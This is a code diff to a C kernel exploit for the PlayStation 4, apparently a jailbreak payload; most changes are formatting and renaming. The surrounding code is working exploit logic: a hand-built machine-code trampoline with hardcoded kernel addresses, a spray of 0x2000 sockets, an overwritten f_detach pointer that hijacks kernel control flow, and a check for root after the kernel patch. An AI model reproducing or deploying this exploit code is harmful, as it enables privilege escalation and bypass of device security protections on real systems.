@@ -7,12 +7,13 @@
 	- @kr105rlz
 */
 
-#define DEBUG_SOCKET 1
-
 #include "ps4.h"
+
+#define DEBUG_SOCKET
 #include "defines.h"
 
 static int sock;
+static void *dump;
 
 void payload(struct knote *kn) {
 	struct thread *td;
@@ -118,11 +119,12 @@ void *exploitThread(void *none) {
 	void *trampe = NULL;
 	int executableHandle;
 	int writableHandle;
-	uint8_t trampolinecode[] = {	0x58, // pop rax
-					0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
-					0x50, // push rax
-					0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
-					0xFF, 0xE0 // jmp rax
+	uint8_t trampolinecode[] = {
+		0x58, // pop rax
+		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
+		0x50, // push rax
+		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
+		0xFF, 0xE0 // jmp rax
 	};
 
 	// Get Jit memory
@@ -135,7 +137,7 @@ void *exploitThread(void *none) {
 
 	// Copy trampoline to allocated address
 	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
-	*(uint64_t*)(trampw + 14) = (uint64_t)payload;
+	*(void **)(trampw + 14) = (void *)payload;
 
 	// Call trampoline when overflown
 	fo.f_detach = trampe;
@@ -148,7 +150,7 @@ void *exploitThread(void *none) {
 	printfsocket("[+] Creating %d sockets\n", fd);
 
 	// Create sockets
-	for(int i=0; i < 0x2000; i++) {
+	for(int i = 0; i < 0x2000; i++) {
 		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
 		if(sockets[i] >= fd) {
 			sockets[i + 1] = -1;
@@ -194,7 +196,7 @@ void *exploitThread(void *none) {
 }
 
 int _main(void) {
-	ScePthread thread1;
+	ScePthread thread;
 
 	initKernel();	
 	initLibc();
@@ -202,7 +204,7 @@ int _main(void) {
 	initJIT();
 	initPthread();
 
-#if DEBUG_SOCKET
+#ifdef DEBUG_SOCKET
 	struct sockaddr_in server;
 
 	server.sin_len = sizeof(server);
@@ -212,8 +214,11 @@ int _main(void) {
 	memset(server.sin_zero, 0, sizeof(server.sin_zero));
 	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
 	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
+	
 	int flag = 1;
 	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
+	
+	dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 #endif
 
 	printfsocket("[+] Starting...\n");
@@ -221,17 +226,17 @@ int _main(void) {
 	printfsocket("[+] GID = %d\n", getgid());
 
 	// Create exploit thread
-	if (scePthreadCreate(&thread1, NULL, exploitThread, NULL, "exploitThread") != 0) {
-		printfsocket("[+] pthread_create error\n");
+	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
+		printfsocket("[-] pthread_create error\n");
 		return 0;
 	}
 
 	// Wait for thread to exit
-	scePthreadJoin(thread1, NULL);
+	scePthreadJoin(thread, NULL);
 
 	// At this point we should have root and jailbreak
 	if(getuid() != 0) {
-		printfsocket("[+] Kernel patch failed!\n");
+		printfsocket("[-] Kernel patch failed!\n");
 		sceNetSocketClose(sock);
 		return 1;
 	}
